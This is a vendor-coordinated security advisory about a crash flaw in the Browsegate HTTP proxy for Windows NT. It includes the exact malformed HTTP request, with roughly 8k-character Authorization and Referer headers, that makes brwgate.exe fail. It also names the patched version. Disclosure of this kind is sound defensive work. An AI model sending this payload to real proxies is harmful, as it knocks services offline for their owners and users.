I. Description
============================================================================

Vendor URL: <http://www.netcplus.com/>

Delphis Consulting Internet Security Team (DCIST) discovered the following
vulnerability in Browsegate under Windows NT.

Severity: medium

It is possible to cause Browsegate to crash with an invalid read error.
This is done by connecting to port 80 upon which the HTTP proxy listens
on and sending the following.

GET / HTTP/1.0<cr>
Authorization: Basic(A x 8k)<cr>
From: dcist@delphisplc.com<cr>
If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT<cr>
Referer: <http://www.delphisplc.com/>(A x 8k)<cr>
UserAgent: DCIST Browser 1.1<cr>
<cr><cr>

This will cause an error brwgate.exe to crash with it's own error handler
twice complaining that memory can not be written or read.

II. Solution
============================================================================

Vendor Status: Informed

Delphis have worked with NetCPlus to resolve the above issue and are happy
to
announce that a patch is availible from their web site:

Site: <http://www.netcplus.com>
Version: v2.80.001

Delphis would like to take this oppertunity to thank Ian Turner and the
developers at Netcplus at the speed they responded.
